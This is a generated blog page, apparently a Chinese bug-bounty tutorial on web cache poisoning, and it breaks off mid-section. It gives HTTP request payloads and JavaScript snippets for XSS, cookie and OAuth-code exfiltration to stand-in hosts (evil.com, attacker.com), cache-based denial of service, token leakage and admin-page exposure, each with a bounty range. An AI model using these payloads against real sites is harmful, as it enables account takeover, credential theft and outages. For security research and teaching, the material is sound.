@@ -1,0 +1,1094 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/admin.jpg">
+  <link rel="icon" href="/img/admin.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="xiaobite">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="缓存投毒 - 2一. XSS1：通过缓存投毒的反射型 XSS赏金范围：$500 — $1,500影响：低（需要受害者访问特定 URL） 123GET &#x2F;page HTTP&#x2F;1.1Host: target.comX-Forwarded-Host: evil.com&quot;&gt;&lt;script&gt;alert(document.domain)&lt;&#x2F;script&gt;  局限性：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="缓存投毒 - 2">
+<meta property="og:url" content="https://xiaobite-hacker.github.io/2026/05/02/%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92-2/index.html">
+<meta property="og:site_name" content="xiaobite">
+<meta property="og:description" content="缓存投毒 - 2一. XSS1：通过缓存投毒的反射型 XSS赏金范围：$500 — $1,500影响：低（需要受害者访问特定 URL） 123GET &#x2F;page HTTP&#x2F;1.1Host: target.comX-Forwarded-Host: evil.com&quot;&gt;&lt;script&gt;alert(document.domain)&lt;&#x2F;script&gt;  局限性：">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-05-01T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-05-02T08:01:54.101Z">
+<meta property="article:author" content="xiaobite">
+<meta property="article:tag" content="缓存投毒">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>缓存投毒 - 2 - xiaobite</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xiaobite-hacker.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>xiaobite</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/prompt/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>prompt</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="缓存投毒 - 2"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-05-02 00:00" pubdate>
+          2026年5月2日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          33 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">缓存投毒 - 2</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="缓存投毒-2"><a href="#缓存投毒-2" class="headerlink" title="缓存投毒 - 2"></a>缓存投毒 - 2</h1><h2 id="一-XSS"><a href="#一-XSS" class="headerlink" title="一. XSS"></a>一. XSS</h2><h3 id="1：通过缓存投毒的反射型-XSS"><a href="#1：通过缓存投毒的反射型-XSS" class="headerlink" title="1：通过缓存投毒的反射型 XSS"></a>1：通过缓存投毒的反射型 XSS</h3><p><strong>赏金范围</strong>：$500 — $1,500<br><strong>影响</strong>：低（需要受害者访问特定 URL）</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/page</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>evil.com&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p><strong>局限性：</strong></p>
+<ul>
+<li>受害者必须访问完全相同的投毒 URL</li>
+<li>缓存可能在受害者访问前过期</li>
+<li>看起来像典型的反射型 XSS</li>
+</ul>
+<h3 id="2：通过缓存投毒的存储型-XSS"><a href="#2：通过缓存投毒的存储型-XSS" class="headerlink" title="2：通过缓存投毒的存储型 XSS"></a>2：通过缓存投毒的存储型 XSS</h3><p><strong>赏金范围</strong>：$2,000 — $5,000<br><strong>影响</strong>：中（自动影响多个用户）</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/popular-page</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>evil.com/xss.js<br></code></pre></td></tr></table></figure>
+
+<p><strong>生成的响应：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://evil.com/xss.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>优势：</strong></p>
+<ul>
+<li>无需用户交互</li>
+<li>影响热门页面的所有访客</li>
+<li>展示真实影响</li>
+</ul>
+<p><strong>真实案例</strong>：<a target="_blank" rel="noopener" href="https://medium.com/@youghourtaghannei/stored-xss-on-tiktok-via-cache-poisoning-attack-vintage-gold-8fb2a3f3dad1">TikTok 通过缓存投毒实现存储型 XSS</a> — 研究者通过投毒缓存绕过了 URL 编码限制，将反射型 XSS 转变为跨所有现代浏览器的存储型 XSS。</p>
+<h3 id="3：通过-Cookie-窃取实现账户接管"><a href="#3：通过-Cookie-窃取实现账户接管" class="headerlink" title="3：通过 Cookie 窃取实现账户接管"></a>3：通过 Cookie 窃取实现账户接管</h3><p><strong>赏金范围</strong>：$5,000 — $12,000<br><strong>影响</strong>：高（大规模凭据盗窃）</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 攻击者的 evil.com/xss.js</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://attacker.com/steal?cookie=&#x27;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);<br></code></pre></td></tr></table></figure>
+
+<p><strong>要求：</strong></p>
+<ul>
+<li>Session Cookie 没有 HttpOnly 标志</li>
+<li>没有 CSP 阻止外部请求</li>
+<li>高流量的热门页面</li>
+</ul>
+<p><strong>真实案例</strong>：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/1760213">Expedia 缓存投毒导致账户接管（报告 #1760213）</a> — <code>hav</code> Cookie 被反射到响应中，允许 XSS 窃取 Session Cookie。缓存投毒将其变为影响该端点所有用户的存储型 XSS。</p>
+<p><strong>升级提示</strong>：计算受影响用户并展示大规模影响：</p>
+<blockquote>
+<p>“该端点每天收到 50,000 次访问。在 30 秒的缓存 TTL 期间，估计有 416 个用户的会话会被窃取。”</p>
+</blockquote>
+<h3 id="4：OAuth-流程劫持"><a href="#4：OAuth-流程劫持" class="headerlink" title="4：OAuth 流程劫持"></a>4：OAuth 流程劫持</h3><p><strong>赏金范围</strong>：$10,000 — $25,000<br><strong>影响</strong>：关键（完整的账户接管链）</p>
+<p><strong>完整的 OAuth 劫持链：</strong></p>
+<p><strong>步骤 1</strong>：投毒主页</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>evil.com/oauth-hijack.js<br></code></pre></td></tr></table></figure>
+
+<p><strong>步骤 2</strong>：攻击者的 oauth-hijack.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 覆盖 OAuth 回调 Cookie（即使 HttpOnly 也可通过 meta 标签操作）</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;oauth_callback=https://evil.com/callback; domain=.target.com&quot;</span>;<br><br><span class="hljs-comment">// 将用户重定向到 OAuth 流程</span><br><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/oauth/authorize&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p><strong>步骤 3</strong>：投毒 OAuth 回调处理器</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/oauth/callback</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>evil.com/steal-code.js<br></code></pre></td></tr></table></figure>
+
+<p><strong>步骤 4</strong>：窃取 OAuth Code</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// steal-code.js</span><br><span class="hljs-keyword">const</span> urlParams = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">search</span>);<br><span class="hljs-keyword">const</span> code = urlParams.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;code&#x27;</span>);<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://attacker.com/collect?code=&#x27;</span> + code);<br></code></pre></td></tr></table></figure>
+
+<p><strong>步骤 5</strong>：用 Code 换取 Access Token</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST https://target.com/oauth/token \<br>  -d <span class="hljs-string">&quot;code=STOLEN_CODE&quot;</span> \<br>  -d <span class="hljs-string">&quot;client_id=CLIENT_ID&quot;</span> \<br>  -d <span class="hljs-string">&quot;client_secret=CLIENT_SECRET&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>真实案例研究</strong>：<a target="_blank" rel="noopener" href="https://www.linkedin.com/pulse/how-i-able-turn-xss-account-takeover-joshua-famubode">Web 缓存投毒到账户接管 — Joshua Famubode</a></p>
+<p>研究者发现：</p>
+<ul>
+<li>通过 X-Forwarded-Host 的全局缓存投毒</li>
+<li>OAuth 实现信任基于 Cookie 的回调 URL</li>
+<li>能够通过 meta 标签覆盖 HttpOnly Cookie</li>
+<li>缓存 TTL 足够长以影响多个用户</li>
+</ul>
+<p><strong>结果</strong>：在缓存窗口期间访问投毒页面的任何用户都会被完全接管账户。</p>
+<h2 id="二-拒绝服务武器化"><a href="#二-拒绝服务武器化" class="headerlink" title="二. 拒绝服务武器化"></a>二. 拒绝服务武器化</h2><h3 id="1：破坏资源加载"><a href="#1：破坏资源加载" class="headerlink" title="1：破坏资源加载"></a>1：破坏资源加载</h3><p><strong>赏金范围</strong>：$1,000 — $3,000</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/assets/main.js</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Forwarded-Port</span><span class="hljs-punctuation">: </span>9999<br></code></pre></td></tr></table></figure>
+
+<p><strong>结果</strong>：所有 JavaScript URL 变为 <code>https://target.com:9999/assets/main.js</code>（不可达）<br><strong>影响</strong>：整个应用程序对所有用户崩溃</p>
+<h3 id="2：错误页面投毒"><a href="#2：错误页面投毒" class="headerlink" title="2：错误页面投毒"></a>2：错误页面投毒</h3><p><strong>赏金范围</strong>：$5,000 — $10,000</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/critical-endpoint</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Original-URL</span><span class="hljs-punctuation">: </span>/trigger-500-error<br></code></pre></td></tr></table></figure>
+
+<p><strong>发生了什么：</strong></p>
+<ul>
+<li>缓存键：<code>/api/critical-endpoint</code></li>
+<li>服务器处理：<code>/trigger-500-error</code></li>
+<li>500 错误响应被缓存</li>
+<li>所有对该关键端点的 API 调用都失败</li>
+</ul>
+<p><strong>真实案例</strong>：<a target="_blank" rel="noopener" href="https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPWEBCACHE.md">PayPal 通过缓存投毒 DoS — $9,700 赏金</a></p>
+<p>这是 HackerOne 上薪酬最高的 Web 缓存报告。研究者在 PayPal 的支付处理端点上造成了持久性 DoS。</p>
+<h3 id="3：重定向循环投毒"><a href="#3：重定向循环投毒" class="headerlink" title="3：重定向循环投毒"></a>3：重定向循环投毒</h3><p><strong>赏金范围</strong>：$7,000 — $15,000</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Forwarded-Scheme</span><span class="hljs-punctuation">: </span>http<br></code></pre></td></tr></table></figure>
+
+<p>对于强制 HTTPS 的应用程序：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 服务端代码</span><br><span class="hljs-keyword">if</span> (req.<span class="hljs-property">headers</span>[<span class="hljs-string">&#x27;x-forwarded-scheme&#x27;</span>] !== <span class="hljs-string">&#x27;https&#x27;</span>) &#123;<br>  res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;https://&#x27;</span> + req.<span class="hljs-property">host</span> + req.<span class="hljs-property">url</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>结果：</strong></p>
+<ul>
+<li>应用程序生成：<code>https://target.com/</code></li>
+<li>浏览器请求：<code>https://target.com/</code></li>
+<li>缓存的响应重定向到：<code>https://target.com/</code>（再次）</li>
+<li>无限重定向循环</li>
+</ul>
+<p><strong>真实案例</strong>：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/409370">HackerOne DoS 报告 #409370</a> — X-Forwarded-Port 在 HackerOne.com 本身造成重定向循环。</p>
+<p>类似攻击：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/1173153">Exodus 缓存投毒 DoS (#1173153)</a>，使用了 <a target="_blank" rel="noopener" href="https://youst.in/posts/cache-poisoning-at-scale/">Youstin 的”大规模缓存投毒”</a> 研究中的技术。</p>
+<h2 id="三-信息泄露"><a href="#三-信息泄露" class="headerlink" title="三. 信息泄露"></a>三. 信息泄露</h2><h3 id="1：Session-Token-泄露"><a href="#1：Session-Token-泄露" class="headerlink" title="1：Session Token 泄露"></a>1：Session Token 泄露</h3><p><strong>赏金范围</strong>：$3,000 — $8,000</p>
+<p><strong>攻击模式：</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/api/user/profile.css</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br></code></pre></td></tr></table></figure>
+
+<p>如果缓存将 <code>.css</code> 视为静态内容：</p>
+<ul>
+<li>API 返回：<code>{&quot;token&quot;: &quot;SECRET123&quot;, &quot;email&quot;: &quot;victim@example.com&quot;}</code></li>
+<li>缓存将其存储为 CSS 文件</li>
+<li>攻击者请求相同 URL</li>
+<li>获取受害者的敏感数据</li>
+</ul>
+<p><strong>真实案例</strong>：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/631589">Lyst Web 缓存投毒（报告 #631589）</a></p>
+<p>研究者展示了：</p>
+<blockquote>
+<p>“登录用户访问：<code>https://www.lyst.com/shop/trends/mens-dress-shoes/blahblah.css</code><br>服务器缓存带有用户会话数据的响应。<br>未登录的攻击者访问相同 URL 并收到缓存的认证响应。”</p>
+</blockquote>
+<h3 id="2：CSRF-Token-泄露"><a href="#2：CSRF-Token-泄露" class="headerlink" title="2：CSRF Token 泄露"></a>2：CSRF Token 泄露</h3><p><strong>赏金范围</strong>：$2,000 — $6,000</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/checkout</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br></code></pre></td></tr></table></figure>
+
+<p>如果服务器返回带有 CSRF Token 的 JSON：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;csrf_token&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;abc123xyz&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;user_id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;12345&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>并且仅基于路径缓存：所有用户获得相同的 CSRF Token，保护失效。</p>
+<p><strong>真实案例</strong>：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/1424094">Glassdoor CSRF Token 缓存投毒 (#1424094)</a></p>
+<p><code>gdToken</code>（反 CSRF Token）在不同页面间被缓存，允许攻击者：</p>
+<ul>
+<li>从缓存中收集有效的 CSRF Token</li>
+<li>在攻击受害者时使用它们</li>
+<li>与 XSS 链接实现完全账户接管</li>
+</ul>
+<h3 id="3：管理面板暴露"><a href="#3：管理面板暴露" class="headerlink" title="3：管理面板暴露"></a>3：管理面板暴露</h3><p><strong>赏金范围</strong>：$8,000 — $20,000</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/static/logo.png</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com<br><span class="hljs-attribute">X-Original-URL</span><span class="hljs-punctuation">: </span>/admin/dashboard<br></code></pre></td></tr></table></figure>
+
+<p><strong>攻击流程：</strong></p>
+<ul>
+<li>缓存键：<code>/static/logo.png</code>（被视为安全&#x2F;公开）</li>
+<li>服务器处理：<code>/admin/dashboard</code>（特权页面）</li>
+<li>管理面板 HTML 被缓存在公开端点</li>
+<li>任何访问 <code>/static/logo.png</code> 的用户都能看到管理面板</li>
+</ul>
+<p><strong>为什么是关键的：</strong></p>
+<ul>
+<li>暴露敏感的管理功能</li>
+<li>可能泄露内部配置</li>
+<li>可能揭示其他漏洞</li>
+<li>完全绕过认证</li>
+</ul>
+<p><strong>真实研究</strong>：记录在 <a target="_blank" rel="noopener" href="https://portswigger.net/research/practical-web-cache-poisoning">James Kettle 的”Practical Web Cache Poisoning”</a> 中，展示了类似的路径混淆攻击。</p>
+<h2 id="四-多阶段攻击链"><a href="#四-多阶段攻击链" class="headerlink" title="四. 多阶段攻击链"></a>四. 多阶段攻击链</h2><h3 id="1：缓存投毒-→-子域名接管-→-XSS"><a href="#1：缓存投毒-→-子域名接管-→-XSS" class="headerlink" title="1：缓存投毒 → 子域名接管 → XSS"></a>1：缓存投毒 → 子域名接管 → XSS</h3><p><strong>步骤 1</strong>：发现缓存投毒</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">X-Forwarded-Prefix</span><span class="hljs-punctuation">: </span>/../../abandoned-subdomain<br></code></pre></td></tr></table></figure>
+
+<p><strong>步骤 2</strong>：发现被遗弃的子域名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">dig abandoned-subdomain.target.com<br><span class="hljs-comment"># 无 DNS 记录，但应用引用了它</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>步骤 3</strong>：接管子域名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在云提供商上声明 abandoned-subdomain.target.com</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>步骤 4</strong>：托管 XSS 载荷</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 在 abandoned-subdomain.target.com 上 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://attacker.com/steal?cookie=&#x27;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>步骤 5</strong>：触发攻击 — 每个访问投毒页面的用户都从你控制的子域名加载脚本。</p>
+<p><strong>赏金范围</strong>：$10,000 — $18,000</p>
+<ul>
+<li>合法子域名（绕过 CSP）</li>
+<li>完全控制载荷</li>
+<li>影响所有用户</li>
+<li>可以在缓存 TTL 之后持续</li>
+</ul>
+<h3 id="2：缓存投毒-→-开放重定向-→-OAuth-钓鱼"><a href="#2：缓存投毒-→-开放重定向-→-OAuth-钓鱼" class="headerlink" title="2：缓存投毒 → 开放重定向 → OAuth 钓鱼"></a>2：缓存投毒 → 开放重定向 → OAuth 钓鱼</h3><p><strong>步骤 1</strong>：缓存投毒</p>
